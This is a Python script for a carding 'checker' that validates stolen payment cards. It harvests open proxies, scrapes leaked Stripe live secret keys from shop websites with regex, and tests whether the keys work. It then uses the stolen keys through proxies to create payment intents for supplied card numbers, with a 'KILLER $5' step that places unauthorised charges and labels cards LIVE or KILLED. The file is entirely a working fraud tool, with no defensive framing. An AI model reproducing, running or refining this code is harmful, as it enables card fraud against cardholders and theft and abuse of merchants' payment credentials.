import requests
import random
import re
import aiohttp
import asyncio
from luhn import is_valid
from bs4 import BeautifulSoup
from config import PROXY_SOURCES, SHOP_LIST

# Globals - Auto managed
proxies = []
sks = []
lock = asyncio.Lock()

async def refresh_proxies():
    global proxies
    all_proxies = []
    for url in PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=10)
            all_proxies.extend([p.strip() for p in resp.text.split('\n') if ':' in p])
        except: pass
    all_proxies = list(set(all_proxies))[:1000]  # Dedup
    
    # Live test top 100
    live_proxies = []
    async with aiohttp.ClientSession() as session:
        tasks = []
        for px in all_proxies[:200]:
            tasks.append(test_proxy(session, px))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        live_proxies = [r for r in results if isinstance(r, str)]
    
    proxies = live_proxies[:50]  # Fast elite
    print(f"🔄 REFRESHED: {len(proxies)} live proxies")

async def test_proxy(session, px):
    try:
        proxy = f"http://{px}"
        async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as r:
            return px if r.status == 200 else None
    except: return None

async def scrape_sks():
    global sks
    new_sks = []
    async with aiohttp.ClientSession() as session:
        for shop in random.sample(SHOP_LIST, min(5, len(SHOP_LIST))):  # Random 5/shops
            try:
                async with session.get(f"{shop}/", timeout=10) as r:
                    if r.status == 200:
                        text = await r.text()
                        # Regex sk_live in JS/HTML
                        found = re.findall(r'sk_live_[0-9a-zA-Z]+', text)
                        new_sks.extend(set(found))
                        
                        # BSoup for inline scripts
                        soup = BeautifulSoup(text, 'html.parser')
                        scripts = soup.find_all('script')
                        for script in scripts:
                            if script.string:
                                found = re.findall(r'sk_live_[0-9a-zA-Z]+', script.string)
                                new_sks.extend(set(found))
            except: pass
    
    # Test new SKs
    live_new = []
    for sk in new_sks[:10]:
        if await test_sk(sk):
            live_new.append(sk)
    
    if live_new:
        sks.extend(live_new)
        sks = sks[-20:]  # Keep top 20
        print(f"🆕 SCRAPED: {len(live_new)} fresh SKs! Total: {len(sks)}")

async def test_sk(sk):
    try:
        headers = {'Authorization': f'Bearer {sk}'}
        resp = requests.post('https://api.stripe.com/v1/payment_intents', headers=headers, data={'amount':'1'}, timeout=10)
        return resp.status_code < 403  # Live if not forbidden
    except: return False

async def get_proxies():
    if not proxies:
        await refresh_proxies()
    return proxies or ['']

async def get_sks():
    if not sks:
        await scrape_sks()
    return sks or ['sk_live_dummy']  # Fallback

async def bin_check(bin_num):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://binlist.net/json/{bin_num}') as r:
                if r.status == 200:
                    data = await r.json()
                    scheme = data.get('scheme', '').lower()
                    return 'visa' in scheme or 'mastercard' in scheme, data.get('bank', {}).get('name', 'Unknown')
    except: pass
    return False, 'Unknown'

async def check_cc(lista):
    global proxies, sks
    parts = re.split(r'[\|/ ]', lista.strip())
    if len(parts) < 4: return "Dead - Format: 4111111111111111|12|25|123"
    cc, mm, yy, cvv = parts[:4]
    
    if not is_valid(cc) or not (1 <= int(mm) <= 12) or int(yy) < 26:
        return "Dead - Luhn/Format"
    
    bin6 = cc[:6]
    valid_bin, bank = await bin_check(bin6)
    if not valid_bin: return f"Dead - BIN {bin6} ({bank})"
    
    px = random.choice(await get_proxies()) if proxies else None
    proxy_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
    
    curr_sks = await get_sks()
    for sk in curr_sks:  # Rotate + drop dead
        try:
            data = {
                'amount': '100', 'currency': 'usd',
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': cc,
                'payment_method_data[card][exp_month]': mm,
                'payment_method_data[card][exp_year]': f'20{yy}',
                'payment_method_data[card][cvc]': cvv,
            }
            headers = {'Authorization': f'Bearer {sk}', 'Content-Type': 'application/x-www-form-urlencoded'}
            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=data, proxies=proxy_dict, headers=headers, timeout=15)
            if resp.status_code == 200 and 'requires_action' not in resp.text.lower():
                # KILLER $5
                killer_data = data.copy(); killer_data['amount'] = '500'
                killer_resp = requests.post('https://api.stripe.com/v1/payment_intents', data=killer_data, proxies=proxy_dict, headers=headers, timeout=15)
                kill_status = " | KILLED $5 ✅" if killer_resp.status_code == 200 else " | LIVE AUTH"
                if not await test_sk(sk):  # Drop if now dead
                    sks.remove(sk)
                return f"LIVE [Stripe] {bank} | BIN:{bin6}{kill_status}"
        except:
            if sk in sks: sks.remove(sk)  # Auto-drop dead
            continue
    return "Dead - Refreshing SKs/Proxies... (shops scraped)"

